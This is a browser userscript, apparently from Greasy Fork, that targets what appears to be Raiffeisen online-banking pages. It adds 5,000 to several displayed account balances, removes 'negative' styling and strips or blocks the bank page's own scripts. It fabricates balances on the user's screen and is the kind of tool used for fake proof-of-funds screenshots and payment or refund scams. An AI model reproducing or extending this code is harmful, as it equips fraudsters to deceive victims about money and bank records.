// ==UserScript==
// @name         Ed 4Rec  raif.maeru 2
// @namespace    http://tampermonkey.net/
// @version      3.77
// @description  with additional conditions, element removal updates, and parent logging
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/520434/Ed%204Rec%20%20raifmaeru%202.user.js
// @updateURL https://update.greasyfork.org/scripts/520434/Ed%204Rec%20%20raifmaeru%202.meta.js
// ==/UserScript==

if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Configurable Elements
    var addMBALANCE_CONFIGS = [
      
        { index: 2, adjustmentAmount: 5000 },
{ index: 3, adjustmentAmount: 5000 },
{ index: 4, adjustmentAmount: 5000 },
{ index: 5, adjustmentAmount: 5000 },
{ index: 6, adjustmentAmount: 5000 },
{ index: 7, adjustmentAmount: 5000 },
{ index: 8, adjustmentAmount: 5000 },
{ index: 9, adjustmentAmount: 5000 },
{ index: 10, adjustmentAmount: 5000 },
{ index: 11, adjustmentAmount: 5000 },
         // Vermögen
        // Add more configurations as needed...
    ];

    // Function to modify the balances
    function modifyBalances() {
        var balanceElements = document.querySelectorAll('.value');
        if (balanceElements.length < 3) {
            console.log("Not enough elements with class 'value' found. Aborting balance modification.");
            return;
        }

        addMBALANCE_CONFIGS.forEach(function(config) {
            var index = config.index;
            var adjustmentAmount = config.adjustmentAmount;
            modifySingleBalance(index, adjustmentAmount);
        });
    }

    // Function to modify a single balance
    function modifySingleBalance(index, adjustmentAmount) {
        var balanceElements = document.querySelectorAll('.value');
        if (balanceElements.length >= index) {
            var balanceElement = balanceElements[index - 1];
            if (balanceElement) {
                var currentBalance = parseFloat(balanceElement.textContent.replace(/[^\d.-]/g, ''));
                var newBalance = currentBalance + adjustmentAmount;
                balanceElement.textContent = formatBalance(newBalance);
                var parent = balanceElement.closest('.output');
                
                // Log the parent element
                console.log("Parent element of balance at index", index, ":", parent);

                if (currentBalance < 0 && newBalance >= 0) {
                    parent.classList.remove('negative');
                }
                console.log("Balance at index", index, "modified:", formatBalance(newBalance));
                setTimeout(function() {
                    var editChooseElement = document.querySelector('.inner.edit-choose');
                    if (editChooseElement) {
                        editChooseElement.remove();
                        console.log("Element with class 'inner.edit-choose' removed.");
                    }
                }, 20);
            } else {
                console.log("Balance element at index", index, "not found.");
            }
        } else {
            console.log("Insufficient number of balance elements to modify at index", index);
        }
    }

    // Function to format the balance
    function formatBalance(balance) {
        return balance.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, "'");
    }

    // Function to check for the presence of required elements
    function checkPresenceOfRequiredElements() {
        var tablistElement = document.querySelector('.visible-phone.visible-desktop');
        var editChooseElement = document.querySelector('.inner.edit-choose');
        if (tablistElement && editChooseElement) {
            console.log("Both required elements found. Modifying balances...");
            modifyBalances();
        } else {
            console.log("Required elements not found. Waiting...");
        }
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var fdfobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    fdfobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Check for the presence of required elements every 150 milliseconds
    setInterval(checkPresenceOfRequiredElements, 150);
}
